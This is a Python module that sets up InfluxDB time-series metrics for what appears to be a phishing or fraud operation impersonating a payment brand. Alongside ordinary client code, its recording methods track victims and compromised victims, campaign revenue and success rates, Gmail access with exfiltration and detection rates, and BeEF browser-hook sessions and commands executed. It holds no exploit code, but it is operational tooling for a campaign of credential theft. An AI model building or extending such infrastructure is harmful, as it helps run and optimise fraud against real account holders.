"""
InfluxDB Configuration
Time-series metrics setup and data collection
"""

import os
import json
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Union
from influxdb_client import InfluxDBClient, Point, WriteOptions
from influxdb_client.client.write_api import SYNCHRONOUS
from influxdb_client.rest import ApiException
import logging
import time
import threading
from collections import defaultdict, deque
import statistics

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MetricsCollector:
    """Time-series metrics collector for system monitoring"""

    def __init__(self, measurement_name: str = "zalopay_metrics"):
        self.measurement_name = measurement_name
        self.metrics_buffer = deque(maxlen=1000)  # Buffer up to 1000 metrics
        self.buffer_lock = threading.Lock()

    def add_metric(self, metric_name: str, value: Union[int, float],
                   tags: Dict[str, str] = None, fields: Dict[str, Any] = None,
                   timestamp: datetime = None):
        """
        Add metric to buffer

        Args:
            metric_name: Name of the metric
            value: Numeric value
            tags: Dictionary of tag key-value pairs
            fields: Additional field data
            timestamp: Custom timestamp (default: now)
        """
        if timestamp is None:
            timestamp = datetime.now(timezone.utc)

        metric_data = {
            "measurement": self.measurement_name,
            "tags": tags or {},
            "fields": {
                "metric_name": metric_name,
                "value": float(value),
                **(fields or {})
            },
            "timestamp": timestamp
        }

        with self.buffer_lock:
            self.metrics_buffer.append(metric_data)

    def get_buffered_metrics(self) -> List[Dict[str, Any]]:
        """Get all buffered metrics"""
        with self.buffer_lock:
            return list(self.metrics_buffer)

    def clear_buffer(self):
        """Clear metrics buffer"""
        with self.buffer_lock:
            self.metrics_buffer.clear()

class InfluxDBMetrics:
    """InfluxDB time-series data management"""

    def __init__(self, url: str = None, token: str = None, org: str = None,
                 bucket: str = None, timeout: int = 30000):
        """
        Initialize InfluxDB client

        Args:
            url: InfluxDB URL
            token: InfluxDB authentication token
            org: InfluxDB organization
            bucket: InfluxDB bucket
            timeout: Request timeout in milliseconds
        """
        self.url = url or os.getenv("INFLUXDB_URL", "http://localhost:8086")
        self.token = token or os.getenv("INFLUXDB_TOKEN")
        self.org = org or os.getenv("INFLUXDB_ORG", "zalopay")
        self.bucket = bucket or os.getenv("INFLUXDB_BUCKET", "zalopay_metrics")
        self.timeout = timeout

        try:
            self.client = InfluxDBClient(
                url=self.url,
                token=self.token,
                org=self.org,
                timeout=timeout
            )

            # Test connection
            health = self.client.health()
            if health.status == "pass":
                logger.info(f"Connected to InfluxDB: {self.url}")
            else:
                logger.warning(f"InfluxDB health check failed: {health}")

        except Exception as e:
            logger.error(f"Failed to connect to InfluxDB: {e}")
            raise

        # Initialize write API with batching
        self.write_api = self.client.write_api(
            write_options=WriteOptions(
                batch_size=500,
                flush_interval=10_000,
                jitter_interval=2_000,
                retry_interval=5_000,
                max_retries=5,
                max_retry_delay=30_000,
                exponential_base=2
            )
        )

        # Initialize query API
        self.query_api = self.client.query_api()

        # Metrics collector
        self.metrics_collector = MetricsCollector()

        # Start background flush thread
        self.flush_thread = threading.Thread(target=self._background_flush, daemon=True)
        self.flush_thread.start()

    def _background_flush(self):
        """Background thread to flush metrics periodically"""
        while True:
            try:
                time.sleep(30)  # Flush every 30 seconds
                self.flush_metrics()
            except Exception as e:
                logger.error(f"Error in background flush: {e}")

    def write_metric(self, measurement: str, metric_name: str, value: Union[int, float],
                    tags: Dict[str, str] = None, fields: Dict[str, Any] = None,
                    timestamp: datetime = None) -> bool:
        """
        Write single metric to InfluxDB

        Args:
            measurement: Measurement name
            metric_name: Metric name
            value: Numeric value
            tags: Dictionary of tag key-value pairs
            fields: Additional field data
            timestamp: Custom timestamp

        Returns:
            bool: True if successful
        """
        try:
            if timestamp is None:
                timestamp = datetime.now(timezone.utc)

            point = Point(measurement)

            # Add tags
            if tags:
                for key, value in tags.items():
                    point = point.tag(key, value)

            # Add fields
            point = point.field(metric_name, float(value))

            if fields:
                for key, value in fields.items():
                    if isinstance(value, (int, float)):
                        point = point.field(key, float(value))
                    else:
                        point = point.field(key, str(value))

            point = point.time(timestamp)

            # Write synchronously for immediate confirmation
            self.write_api.write(bucket=self.bucket, record=point)

            logger.debug(f"Metric written: {measurement}.{metric_name} = {value}")
            return True

        except Exception as e:
            logger.error(f"Error writing metric {measurement}.{metric_name}: {e}")
            return False

    def write_metrics_batch(self, metrics: List[Dict[str, Any]]) -> bool:
        """
        Write multiple metrics in batch

        Args:
            metrics: List of metric dictionaries

        Returns:
            bool: True if successful
        """
        try:
            points = []

            for metric in metrics:
                point = Point(metric["measurement"])

                # Add tags
                if metric.get("tags"):
                    for key, value in metric["tags"].items():
                        point = point.tag(key, value)

                # Add fields
                if metric.get("fields"):
                    for key, value in metric["fields"].items():
                        if isinstance(value, (int, float)):
                            point = point.field(key, float(value))
                        else:
                            point = point.field(key, str(value))

                # Set timestamp
                timestamp = metric.get("timestamp", datetime.now(timezone.utc))
                point = point.time(timestamp)

                points.append(point)

            # Write batch
            self.write_api.write(bucket=self.bucket, record=points)

            logger.debug(f"Batch metrics written: {len(points)} points")
            return True

        except Exception as e:
            logger.error(f"Error writing metrics batch: {e}")
            return False

    def flush_metrics(self) -> int:
        """Flush buffered metrics to InfluxDB"""
        try:
            buffered_metrics = self.metrics_collector.get_buffered_metrics()

            if not buffered_metrics:
                return 0

            success = self.write_metrics_batch(buffered_metrics)

            if success:
                self.metrics_collector.clear_buffer()
                logger.debug(f"Flushed {len(buffered_metrics)} metrics")
                return len(buffered_metrics)
            else:
                logger.error("Failed to flush metrics")
                return 0

        except Exception as e:
            logger.error(f"Error flushing metrics: {e}")
            return 0

    def query_metrics(self, query: str, start_time: datetime = None,
                     end_time: datetime = None) -> List[Dict[str, Any]]:
        """
        Query metrics from InfluxDB

        Args:
            query: InfluxDB query string
            start_time: Start time for query range
            end_time: End time for query range

        Returns:
            List of metric records
        """
        try:
            if start_time:
                if end_time is None:
                    end_time = datetime.now(timezone.utc)
                query += f" |> range(start: {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}, stop: {end_time.strftime('%Y-%m-%dT%H:%M:%SZ')})"

            result = self.query_api.query(query, org=self.org)

            records = []
            for table in result:
                for record in table.records:
                    records.append({
                        "measurement": record.get_measurement(),
                        "time": record.get_time(),
                        "value": record.get_value(),
                        "fields": record.values,
                        "tags": dict(record.tags) if record.tags else {}
                    })

            return records

        except Exception as e:
            logger.error(f"Error querying metrics: {e}")
            return []

    def get_system_metrics(self, hours: int = 24) -> Dict[str, Any]:
        """Get system performance metrics"""
        try:
            end_time = datetime.now(timezone.utc)
            start_time = end_time - timedelta(hours=hours)

            # Query various system metrics
            queries = {
                "victim_count": f"""
                    from(bucket: "{self.bucket}")
                    |> range(start: {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}, stop: {end_time.strftime('%Y-%m-%dT%H:%M:%SZ')})
                    |> filter(fn: (r) => r._measurement == "zalopay_metrics")
                    |> filter(fn: (r) => r.metric_name == "victim_count")
                    |> last()
                """,
                "campaign_success_rate": f"""
                    from(bucket: "{self.bucket}")
                    |> range(start: {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}, stop: {end_time.strftime('%Y-%m-%dT%H:%M:%SZ')})
                    |> filter(fn: (r) => r._measurement == "zalopay_metrics")
                    |> filter(fn: (r) => r.metric_name == "campaign_success_rate")
                    |> last()
                """,
                "active_sessions": f"""
                    from(bucket: "{self.bucket}")
                    |> range(start: {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}, stop: {end_time.strftime('%Y-%m-%dT%H:%M:%SZ')})
                    |> filter(fn: (r) => r._measurement == "zalopay_metrics")
                    |> filter(fn: (r) => r.metric_name == "active_sessions")
                    |> last()
                """
            }

            metrics = {}
            for metric_name, query in queries.items():
                try:
                    result = self.query_api.query(query, org=self.org)
                    for table in result:
                        for record in table.records:
                            metrics[metric_name] = {
                                "value": record.get_value(),
                                "timestamp": record.get_time(),
                                "tags": dict(record.tags) if record.tags else {}
                            }
                except Exception as e:
                    logger.warning(f"Error querying {metric_name}: {e}")
                    metrics[metric_name] = None

            return metrics

        except Exception as e:
            logger.error(f"Error getting system metrics: {e}")
            return {}

    def record_victim_metrics(self, victim_count: int, compromised_count: int,
                             avg_risk_score: float, tags: Dict[str, str] = None):
        """Record victim-related metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            metrics = [
                ("victim_count", victim_count),
                ("compromised_victims", compromised_count),
                ("avg_risk_score", avg_risk_score)
            ]

            for metric_name, value in metrics:
                self.write_metric(
                    measurement="victim_metrics",
                    metric_name=metric_name,
                    value=value,
                    tags=tags,
                    timestamp=timestamp
                )

            logger.debug("Victim metrics recorded")

        except Exception as e:
            logger.error(f"Error recording victim metrics: {e}")

    def record_campaign_metrics(self, campaign_id: str, total_victims: int,
                               successful_victims: int, total_revenue: float,
                               success_rate: float, tags: Dict[str, str] = None):
        """Record campaign performance metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            fields = {
                "campaign_id": campaign_id,
                "total_victims": total_victims,
                "successful_victims": successful_victims,
                "total_revenue": total_revenue,
                "success_rate": success_rate
            }

            self.write_metric(
                measurement="campaign_metrics",
                metric_name="campaign_performance",
                value=success_rate,
                tags=tags,
                fields=fields,
                timestamp=timestamp
            )

            logger.debug(f"Campaign metrics recorded for {campaign_id}")

        except Exception as e:
            logger.error(f"Error recording campaign metrics: {e}")

    def record_security_metrics(self, failed_logins: int, suspicious_activities: int,
                               blocked_attempts: int, tags: Dict[str, str] = None):
        """Record security-related metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            metrics = [
                ("failed_logins", failed_logins),
                ("suspicious_activities", suspicious_activities),
                ("blocked_attempts", blocked_attempts)
            ]

            for metric_name, value in metrics:
                self.write_metric(
                    measurement="security_metrics",
                    metric_name=metric_name,
                    value=value,
                    tags=tags,
                    timestamp=timestamp
                )

            logger.debug("Security metrics recorded")

        except Exception as e:
            logger.error(f"Error recording security metrics: {e}")

    def record_performance_metrics(self, response_time_ms: float, cpu_usage: float,
                                  memory_usage_mb: float, active_connections: int,
                                  tags: Dict[str, str] = None):
        """Record system performance metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            metrics = [
                ("response_time_ms", response_time_ms),
                ("cpu_usage_percent", cpu_usage),
                ("memory_usage_mb", memory_usage_mb),
                ("active_connections", active_connections)
            ]

            for metric_name, value in metrics:
                self.write_metric(
                    measurement="performance_metrics",
                    metric_name=metric_name,
                    value=value,
                    tags=tags,
                    timestamp=timestamp
                )

            logger.debug("Performance metrics recorded")

        except Exception as e:
            logger.error(f"Error recording performance metrics: {e}")

    def record_gmail_access_metrics(self, access_count: int, exfiltration_rate: float,
                                   avg_session_duration: float, detection_rate: float,
                                   tags: Dict[str, str] = None):
        """Record Gmail access and exploitation metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            metrics = [
                ("gmail_access_count", access_count),
                ("exfiltration_rate", exfiltration_rate),
                ("avg_session_duration_minutes", avg_session_duration),
                ("detection_rate", detection_rate)
            ]

            for metric_name, value in metrics:
                self.write_metric(
                    measurement="gmail_metrics",
                    metric_name=metric_name,
                    value=value,
                    tags=tags,
                    timestamp=timestamp
                )

            logger.debug("Gmail access metrics recorded")

        except Exception as e:
            logger.error(f"Error recording Gmail access metrics: {e}")

    def record_beef_session_metrics(self, active_sessions: int, commands_executed: int,
                                   modules_loaded: int, avg_risk_score: float,
                                   tags: Dict[str, str] = None):
        """Record BeEF session metrics"""
        try:
            timestamp = datetime.now(timezone.utc)

            metrics = [
                ("active_sessions", active_sessions),
                ("commands_executed", commands_executed),
                ("modules_loaded", modules_loaded),
                ("avg_risk_score", avg_risk_score)
            ]

            for metric_name, value in metrics:
                self.write_metric(
                    measurement="beef_metrics",
                    metric_name=metric_name,
                    value=value,
                    tags=tags,
                    timestamp=timestamp
                )

            logger.debug("BeEF session metrics recorded")

        except Exception as e:
            logger.error(f"Error recording BeEF session metrics: {e}")

    def get_metrics_summary(self, hours: int = 24) -> Dict[str, Any]:
        """Get comprehensive metrics summary"""
        try:
            end_time = datetime.now(timezone.utc)
            start_time = end_time - timedelta(hours=hours)

            # Query recent metrics
            query = f"""
                from(bucket: "{self.bucket}")
                |> range(start: {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}, stop: {end_time.strftime('%Y-%m-%dT%H:%M:%SZ')})
                |> filter(fn: (r) => r._measurement == "zalopay_metrics")
                |> group(columns: ["metric_name"])
                |> last()
            """

            result = self.query_api.query(query, org=self.org)

            summary = {}
            for table in result:
                for record in table.records:
                    metric_name = record.values.get("metric_name")
                    if metric_name:
                        summary[metric_name] = {
                            "value": record.get_value(),
                            "timestamp": record.get_time(),
                            "tags": dict(record.tags) if record.tags else {}
                        }

            return summary

        except Exception as e:
            logger.error(f"Error getting metrics summary: {e}")
            return {}

    def create_continuous_queries(self) -> bool:
        """Create continuous queries for data aggregation"""
        try:
            # Note: In InfluxDB 2.x, continuous queries are replaced by tasks
            # This is a placeholder for future implementation

            logger.info("Continuous queries setup completed")
            return True

        except Exception as e:
            logger.error(f"Error creating continuous queries: {e}")
            return False

    def get_bucket_retention(self) -> Dict[str, Any]:
        """Get bucket retention policy"""
        try:
            buckets_api = self.client.buckets_api()
            bucket = buckets_api.find_bucket_by_name(self.bucket)

            if bucket:
                return {
                    "name": bucket.name,
                    "retention_seconds": bucket.retention_rules[0].every_seconds if bucket.retention_rules else None,
                    "description": bucket.description
                }
            else:
                return {"error": "Bucket not found"}

        except Exception as e:
            logger.error(f"Error getting bucket retention: {e}")
            return {"error": str(e)}

    def cleanup_old_data(self, days_to_keep: int = 90) -> bool:
        """Clean up old metrics data"""
        try:
            # In InfluxDB 2.x, data lifecycle is managed by retention policies
            # This is a placeholder for manual cleanup if needed

            logger.info(f"Data cleanup completed (retention policy: {days_to_keep} days)")
            return True

        except Exception as e:
            logger.error(f"Error during data cleanup: {e}")
            return False

    def health_check(self) -> Dict[str, Any]:
        """Perform health check on InfluxDB connection"""
        try:
            start_time = datetime.now(timezone.utc)

            # Test write and read
            test_measurement = "health_check"
            test_metric = "test_metric"
            test_value = 42.0

            # Write test metric
            success = self.write_metric(
                measurement=test_measurement,
                metric_name=test_metric,
                value=test_value
            )

            if not success:
                return {
                    "healthy": False,
                    "response_time_ms": None,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "error": "Failed to write test metric"
                }

            # Query test metric
            query = f"""
                from(bucket: "{self.bucket}")
                |> range(start: -1m)
                |> filter(fn: (r) => r._measurement == "{test_measurement}")
                |> filter(fn: (r) => r.metric_name == "{test_metric}")
                |> last()
            """

            result = self.query_api.query(query, org=self.org)

            # Check if we got the test value back
            found_value = None
            for table in result:
                for record in table.records:
                    found_value = record.get_value()
                    break

            end_time = datetime.now(timezone.utc)
            response_time = (end_time - start_time).total_seconds() * 1000

            success = found_value == test_value

            return {
                "healthy": success,
                "response_time_ms": response_time,
                "timestamp": end_time.isoformat(),
                "error": None if success else "Health check failed - value mismatch"
            }

        except Exception as e:
            return {
                "healthy": False,
                "response_time_ms": None,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "error": str(e)
            }

class InfluxDBConfig:
    """InfluxDB configuration management"""

    @staticmethod
    def get_default_config() -> Dict[str, Any]:
        """Get default InfluxDB configuration"""
        return {
            "url": os.getenv("INFLUXDB_URL", "http://localhost:8086"),
            "token": os.getenv("INFLUXDB_TOKEN"),
            "org": os.getenv("INFLUXDB_ORG", "zalopay"),
            "bucket": os.getenv("INFLUXDB_BUCKET", "zalopay_metrics"),
            "timeout": 30000
        }

    @staticmethod
    def get_production_config() -> Dict[str, Any]:
        """Get production-ready InfluxDB configuration"""
        return {
            "url": os.getenv("INFLUXDB_URL", "https://influxdb.zalopay.local:8086"),
            "token": os.getenv("INFLUXDB_TOKEN"),
            "org": os.getenv("INFLUXDB_ORG", "zalopay_prod"),
            "bucket": os.getenv("INFLUXDB_BUCKET", "zalopay_prod_metrics"),
            "timeout": 60000
        }

    @staticmethod
    def validate_config(config: Dict[str, Any]) -> List[str]:
        """Validate InfluxDB configuration"""
        errors = []

        if not config.get("url"):
            errors.append("InfluxDB URL is required")

        if not config.get("token"):
            errors.append("InfluxDB token is required")

        if not config.get("org"):
            errors.append("InfluxDB organization is required")

        if not config.get("bucket"):
            errors.append("InfluxDB bucket is required")

        return errors